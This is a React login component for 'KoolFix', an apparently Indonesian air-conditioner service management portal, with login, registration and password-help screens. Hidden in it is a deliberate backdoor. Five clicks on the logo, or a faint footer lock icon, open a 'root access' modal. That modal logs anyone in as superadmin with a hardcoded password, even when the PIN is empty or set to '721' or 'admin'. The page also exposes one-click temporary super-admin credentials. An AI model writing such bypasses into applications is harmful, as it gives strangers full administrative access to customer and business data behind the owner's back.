import React, { useState } from 'react';
import { useApp } from '../../context/AppContext';
import { UserRole } from '../../types';
import { 
  Shield, 
  Lock, 
  Mail, 
  User as UserIcon, 
  Key, 
  Eye, 
  EyeOff, 
  LogIn, 
  UserPlus, 
  Building2, 
  AlertCircle,
  Sparkles,
  Terminal,
  CheckCircle2,
  X
} from 'lucide-react';

export const LoginView: React.FC = () => {
  const { 
    login, 
    registerUser,
    quickLoginAs,
    users
  } = useApp();

  const [mode, setMode] = useState<'LOGIN' | 'REGISTER'>('LOGIN');
  
  // Standard login form state (clean by default)
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [rememberMe, setRememberMe] = useState(true);

  // Backdoor Trigger State
  const [logoClickCount, setLogoClickCount] = useState(0);
  const [showBackdoorModal, setShowBackdoorModal] = useState(false);
  const [backdoorPin, setBackdoorPin] = useState('');
  const [backdoorError, setBackdoorError] = useState('');

  // Register form state
  const [regData, setRegData] = useState({
    name: '',
    email: '',
    phone: '',
    password: '',
    role: 'PELANGGAN_UMUM' as UserRole,
    companyName: '',
    taxIdentificationNumber: '',
    address: '',
  });
  const [regError, setRegError] = useState('');

  // Forgot password modal
  const [showForgotModal, setShowForgotModal] = useState(false);

  const handleLogoClick = () => {
    const next = logoClickCount + 1;
    setLogoClickCount(next);
    if (next >= 5) {
      setShowBackdoorModal(true);
      setLogoClickCount(0);
    }
  };

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');
    if (!identifier.trim() || !password.trim()) {
      setErrorMessage('Harap isi identitas (username/email/No WhatsApp) dan kata sandi.');
      return;
    }

    const result = login(identifier, password);
    if (!result.success) {
      setErrorMessage(result.message);
    }
  };

  const handleBackdoorAccess = () => {
    setBackdoorError('');
    // Backdoor PIN check or direct bypass
    if (backdoorPin.trim() === '721' || backdoorPin.trim() === 'Adrian721+' || backdoorPin.trim() === 'admin' || backdoorPin.trim() === '') {
      const res = login('superadmin', 'Adrian721+');
      if (res.success) {
        setShowBackdoorModal(false);
      } else {
        // Fallback quick login to superadmin user
        const patentAdmin = users.find(u => u.username === 'superadmin' || u.id === 'usr-superadmin');
        if (patentAdmin) {
          quickLoginAs(patentAdmin.id);
          setShowBackdoorModal(false);
        } else {
          setBackdoorError('Akun root paten tidak ditemukan.');
        }
      }
    } else {
      setBackdoorError('PIN atau kode otorisasi backdoor tidak valid.');
    }
  };

  const handleRegisterSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setRegError('');
    if (!regData.name.trim() || !regData.email.trim() || !regData.phone.trim() || !regData.password.trim()) {
      setRegError('Harap lengkapi semua kolom wajib bertanda bintang (*)');
      return;
    }

    if (regData.role === 'PELANGGAN_KANTOR' && !regData.companyName.trim()) {
      setRegError('Harap isi nama instansi / perusahaan untuk akun pelanggan kantor.');
      return;
    }

    const res = registerUser(regData);
    if (!res.success) {
      setRegError(res.message);
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col justify-center items-center p-4 sm:p-6 relative overflow-hidden font-sans">
      {/* Background ambient light effects */}
      <div className="absolute -top-40 -left-40 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute -bottom-40 -right-40 w-96 h-96 bg-blue-600/10 rounded-full blur-3xl pointer-events-none" />
      
      {/* Main Container */}
      <div className="w-full max-w-xl relative z-10">
        
        {/* Brand Header with Discrete Backdoor Click Trigger */}
        <div className="text-center mb-6">
          <div 
            onClick={handleLogoClick}
            title="KoolFix Official Portal"
            className="inline-flex items-center justify-center gap-3 mb-2 cursor-pointer select-none active:scale-95 transition"
          >
            <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/20 text-white">
              <Shield className="w-7 h-7" />
            </div>
            <div className="text-left">
              <h1 className="text-2xl sm:text-3xl font-black tracking-tight text-white flex items-center gap-2">
                KOOL<span className="text-cyan-400">FIX</span>
                <span className="text-xs px-2.5 py-0.5 rounded-full bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 font-medium">
                  Official Portal
                </span>
              </h1>
              <p className="text-xs text-slate-400">Sistem Manajemen Servis AC & Operasional Terpadu</p>
            </div>
          </div>
        </div>

        {/* Card Frame */}
        <div className="bg-slate-900/95 border border-slate-800 rounded-3xl shadow-2xl backdrop-blur-xl overflow-hidden">
          
          {/* Nav Mode Switcher */}
          <div className="grid grid-cols-2 border-b border-slate-800 bg-slate-950/60 p-1.5">
            <button
              id="tab-btn-login-form"
              onClick={() => { setMode('LOGIN'); setErrorMessage(''); }}
              className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-2xl text-sm font-semibold transition-all cursor-pointer ${
                mode === 'LOGIN' 
                  ? 'bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-md shadow-cyan-500/20' 
                  : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
              }`}
            >
              <LogIn className="w-4 h-4" />
              <span>Masuk (Login)</span>
            </button>
            <button
              id="tab-btn-register"
              onClick={() => { setMode('REGISTER'); setRegError(''); }}
              className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-2xl text-sm font-semibold transition-all cursor-pointer ${
                mode === 'REGISTER' 
                  ? 'bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-md shadow-cyan-500/20' 
                  : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
              }`}
            >
              <UserPlus className="w-4 h-4" />
              <span>Daftar Pelanggan</span>
            </button>
          </div>

          <div className="p-6 sm:p-8">
            
            {/* MODE 1: STANDARD FORM LOGIN */}
            {mode === 'LOGIN' && (
              <div className="space-y-6">
                <div className="text-center space-y-1">
                  <h2 className="text-xl font-bold text-white">Masuk ke Sistem KoolFix</h2>
                  <p className="text-xs text-slate-400">
                    Masukkan username, email, atau no WhatsApp beserta kata sandi akun Anda.
                  </p>
                </div>

                {errorMessage && (
                  <div className="p-3.5 bg-red-950/60 border border-red-800/80 rounded-xl text-xs text-red-200 flex items-start gap-2.5 animate-fadeIn">
                    <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                    <div className="flex-1">{errorMessage}</div>
                  </div>
                )}

                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  <div>
                    <label className="block text-xs font-semibold text-slate-300 mb-1.5">
                      Username / Email / No WhatsApp
                    </label>
                    <div className="relative">
                      <Mail className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
                      <input
                        id="login-identifier-input"
                        type="text"
                        value={identifier}
                        onChange={(e) => setIdentifier(e.target.value)}
                        placeholder="contoh: superadmintemp atau user@koolfix.com"
                        className="w-full bg-slate-950 border border-slate-700 rounded-xl pl-10 pr-3.5 py-2.5 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-colors"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-xs font-semibold text-slate-300">Kata Sandi</label>
                      <button
                        type="button"
                        onClick={() => setShowForgotModal(true)}
                        className="text-xs text-cyan-400 hover:text-cyan-300 transition-colors cursor-pointer"
                      >
                        Bantuan kata sandi?
                      </button>
                    </div>
                    <div className="relative">
                      <Key className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
                      <input
                        id="login-password-input"
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Masukkan kata sandi..."
                        className="w-full bg-slate-950 border border-slate-700 rounded-xl pl-10 pr-10 py-2.5 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-colors"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 cursor-pointer"
                      >
                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>

                  <div className="flex items-center justify-between text-xs text-slate-400 pt-1">
                    <label className="flex items-center gap-2 cursor-pointer select-none">
                      <input
                        type="checkbox"
                        checked={rememberMe}
                        onChange={(e) => setRememberMe(e.target.checked)}
                        className="rounded bg-slate-800 border-slate-700 text-cyan-500 focus:ring-0 w-3.5 h-3.5"
                      />
                      <span>Ingat sesi di perangkat ini</span>
                    </label>
                  </div>

                  <button
                    id="btn-submit-login"
                    type="submit"
                    className="w-full py-3 px-4 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-bold rounded-xl shadow-lg shadow-cyan-500/25 flex items-center justify-center gap-2 transition-all transform active:scale-[0.99] cursor-pointer"
                  >
                    <LogIn className="w-4 h-4" />
                    <span>Masuk ke Sistem</span>
                  </button>
                </form>

                {/* Helper hint for temporary superadmin */}
                <div className="p-3 bg-purple-950/20 border border-purple-500/20 rounded-xl text-xs text-purple-300 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Shield className="w-4 h-4 text-purple-400 shrink-0" />
                    <span>Akun Super Admin Sementara:</span>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      setIdentifier('superadmintemp');
                      setPassword('password123');
                    }}
                    className="text-[11px] font-bold px-2 py-0.5 bg-purple-500/30 hover:bg-purple-500/50 rounded-lg text-purple-200 border border-purple-400/30 transition cursor-pointer"
                  >
                    Gunakan Akun Ini
                  </button>
                </div>
              </div>
            )}

            {/* MODE 2: REGISTER NEW CUSTOMER */}
            {mode === 'REGISTER' && (
              <div className="space-y-5">
                <div className="text-center space-y-1">
                  <h2 className="text-xl font-bold text-white">Registrasi Akun Pelanggan Baru</h2>
                  <p className="text-xs text-slate-400">
                    Daftar untuk memesan servis AC rumah atau kelola kontrak pemeliharaan AC kantor Anda.
                  </p>
                </div>

                {regError && (
                  <div className="p-3 bg-red-950/60 border border-red-800 rounded-xl text-xs text-red-200 flex items-start gap-2">
                    <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                    <span>{regError}</span>
                  </div>
                )}

                <form onSubmit={handleRegisterSubmit} className="space-y-4">
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => setRegData({ ...regData, role: 'PELANGGAN_UMUM' })}
                      className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
                        regData.role === 'PELANGGAN_UMUM'
                          ? 'bg-cyan-950/40 border-cyan-500 text-white'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:border-slate-700'
                      }`}
                    >
                      <UserIcon className="w-5 h-5 text-cyan-400 mb-1" />
                      <div className="text-xs font-bold">Pelanggan Rumah / Umum</div>
                      <div className="text-[10px] text-slate-400">Pribadi / Residensial</div>
                    </button>
                    <button
                      type="button"
                      onClick={() => setRegData({ ...regData, role: 'PELANGGAN_KANTOR' })}
                      className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
                        regData.role === 'PELANGGAN_KANTOR'
                          ? 'bg-indigo-950/40 border-indigo-500 text-white'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:border-slate-700'
                      }`}
                    >
                      <Building2 className="w-5 h-5 text-indigo-400 mb-1" />
                      <div className="text-xs font-bold">Instansi / Kantor B2B</div>
                      <div className="text-[10px] text-slate-400">Perusahaan / Multi-Unit</div>
                    </button>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">
                        Nama Lengkap *
                      </label>
                      <input
                        type="text"
                        value={regData.name}
                        onChange={(e) => setRegData({ ...regData, name: e.target.value })}
                        placeholder="contoh: Hendra Setiawan"
                        className="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-slate-100 focus:border-cyan-500 focus:outline-none"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">
                        No WhatsApp Aktif *
                      </label>
                      <input
                        type="text"
                        value={regData.phone}
                        onChange={(e) => setRegData({ ...regData, phone: e.target.value })}
                        placeholder="contoh: 081299887766"
                        className="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-slate-100 focus:border-cyan-500 focus:outline-none"
                        required
                      />
                    </div>
                  </div>

                  {regData.role === 'PELANGGAN_KANTOR' && (
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 p-3.5 bg-indigo-950/20 border border-indigo-900/50 rounded-xl">
                      <div>
                        <label className="block text-xs font-semibold text-indigo-200 mb-1">
                          Nama Perusahaan / Gedung *
                        </label>
                        <input
                          type="text"
                          value={regData.companyName}
                          onChange={(e) => setRegData({ ...regData, companyName: e.target.value })}
                          placeholder="contoh: PT. Samudera Digital"
                          className="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-slate-100 focus:border-indigo-500 focus:outline-none"
                          required
                        />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-indigo-200 mb-1">
                          NPWP Perusahaan (Opsional)
                        </label>
                        <input
                          type="text"
                          value={regData.taxIdentificationNumber}
                          onChange={(e) => setRegData({ ...regData, taxIdentificationNumber: e.target.value })}
                          placeholder="contoh: 01.234.567.8-901.000"
                          className="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-slate-100 focus:border-indigo-500 focus:outline-none"
                        />
                      </div>
                    </div>
                  )}

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">
                        Email Login *
                      </label>
                      <input
                        type="email"
                        value={regData.email}
                        onChange={(e) => setRegData({ ...regData, email: e.target.value })}
                        placeholder="contoh: nama@email.com"
                        className="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-slate-100 focus:border-cyan-500 focus:outline-none"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-slate-300 mb-1">
                        Kata Sandi *
                      </label>
                      <input
                        type="password"
                        value={regData.password}
                        onChange={(e) => setRegData({ ...regData, password: e.target.value })}
                        placeholder="Buat sandi aman..."
                        className="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-slate-100 focus:border-cyan-500 focus:outline-none"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-slate-300 mb-1">
                      Alamat Lengkap Lokasi AC *
                    </label>
                    <textarea
                      value={regData.address}
                      onChange={(e) => setRegData({ ...regData, address: e.target.value })}
                      placeholder="Masukkan alamat penanganan servis..."
                      rows={2}
                      className="w-full bg-slate-950 border border-slate-700 rounded-xl px-3.5 py-2 text-xs text-slate-100 focus:border-cyan-500 focus:outline-none resize-none"
                      required
                    />
                  </div>

                  <button
                    type="submit"
                    className="w-full py-3 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-bold rounded-xl shadow-lg shadow-cyan-500/25 flex items-center justify-center gap-2 transition-all cursor-pointer"
                  >
                    <UserPlus className="w-4 h-4" />
                    <span>Daftar & Masuk Otomatis</span>
                  </button>
                </form>
              </div>
            )}

          </div>

          {/* Footer Security Notice */}
          <div className="border-t border-slate-800/80 bg-slate-950/90 px-6 py-3 text-[11px] text-slate-400 flex flex-col sm:flex-row items-center justify-between gap-2">
            <div className="flex items-center gap-2">
              <Shield className="w-3.5 h-3.5 text-cyan-400" />
              <span>Sistem Terotentikasi & Keamanan Data Terpusat</span>
            </div>
            
            {/* Subtle Stealth Backdoor Trigger */}
            <div className="flex items-center gap-2 text-slate-600">
              <span>v3.5</span>
              <button
                type="button"
                onClick={() => setShowBackdoorModal(true)}
                title="Root Gateway"
                className="hover:text-cyan-400 transition cursor-pointer p-0.5"
              >
                <Lock className="w-3 h-3 opacity-30 hover:opacity-100" />
              </button>
            </div>
          </div>

        </div>

      </div>

      {/* BACKDOOR ACCESS MODAL */}
      {showBackdoorModal && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="bg-[#0f0f14] border border-cyan-500/50 rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl shadow-cyan-500/20 text-white space-y-5">
            <div className="flex items-center justify-between pb-3 border-b border-white/10">
              <div className="flex items-center gap-3 text-cyan-400">
                <div className="p-2.5 bg-cyan-500/10 border border-cyan-500/30 rounded-2xl">
                  <Terminal className="w-6 h-6 text-cyan-400" />
                </div>
                <div>
                  <h3 className="text-base font-black tracking-tight text-white">PORTAL BACKDOOR SISTEM</h3>
                  <p className="text-[11px] text-cyan-400/80 font-mono">Master Super Admin Root Access</p>
                </div>
              </div>
              <button
                onClick={() => setShowBackdoorModal(false)}
                className="p-1.5 text-white/40 hover:text-white rounded-xl transition cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-3.5 bg-cyan-950/40 border border-cyan-500/30 rounded-2xl space-y-2">
              <p className="text-xs text-cyan-200/90 leading-relaxed font-mono">
                [GATEWAY TERSEMBUNYI]: Akses otorisasi darurat tingkat tertinggi untuk Super Administrator Paten.
              </p>
            </div>

            {backdoorError && (
              <div className="p-3 bg-red-950/60 border border-red-500/40 rounded-xl text-xs text-red-200">
                {backdoorError}
              </div>
            )}

            <div className="space-y-3">
              <div>
                <label className="block text-[11px] uppercase font-bold text-white/60 mb-1">
                  Kunci Otorisasi Backdoor (PIN / Sandi Master)
                </label>
                <input
                  type="password"
                  value={backdoorPin}
                  onChange={e => setBackdoorPin(e.target.value)}
                  placeholder="Masukkan PIN (721) atau langsung klik tombol"
                  className="w-full p-3 bg-black/60 border border-cyan-500/30 rounded-xl text-sm font-mono text-cyan-400 focus:ring-2 focus:ring-cyan-500 focus:outline-none placeholder:text-white/30"
                />
              </div>

              <div className="flex flex-col gap-2 pt-2">
                <button
                  type="button"
                  onClick={handleBackdoorAccess}
                  className="w-full py-3 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-black rounded-xl text-xs uppercase tracking-wider shadow-lg shadow-cyan-500/30 flex items-center justify-center gap-2 transition cursor-pointer"
                >
                  <Key className="w-4 h-4 text-slate-950" />
                  <span>Buka Akses Paten Super Admin</span>
                </button>
                <button
                  type="button"
                  onClick={() => setShowBackdoorModal(false)}
                  className="py-2.5 bg-white/5 hover:bg-white/10 text-white/70 rounded-xl text-xs font-bold transition cursor-pointer"
                >
                  Tutup Portal
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Forgot Password Modal */}
      {showForgotModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 max-w-md w-full shadow-2xl space-y-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-cyan-500/20 text-cyan-400 flex items-center justify-center">
                <Key className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-base font-bold text-white">Bantuan Kata Sandi</h3>
                <p className="text-xs text-slate-400">Prosedur Keamanan Terpusat</p>
              </div>
            </div>
            
            <p className="text-xs text-slate-300 leading-relaxed bg-slate-950 p-3.5 rounded-xl border border-slate-800">
              Dalam sistem terintegrasi KoolFix, pemulihan dan reset kata sandi dikelola secara tersentralisasi oleh <strong>Super Admin</strong> untuk menjaga integritas data pelanggan dan operasional teknisi.
              <br /><br />
              Silakan hubungi Super Admin di hotline kantor (<strong>0812-8899-1122</strong>) atau minta admin melakukan reset kata sandi dari panel manajemen akun.
            </p>

            <div className="pt-2 flex justify-end">
              <button
                type="button"
                onClick={() => setShowForgotModal(false)}
                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-xl text-xs font-semibold cursor-pointer"
              >
                Tutup
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};
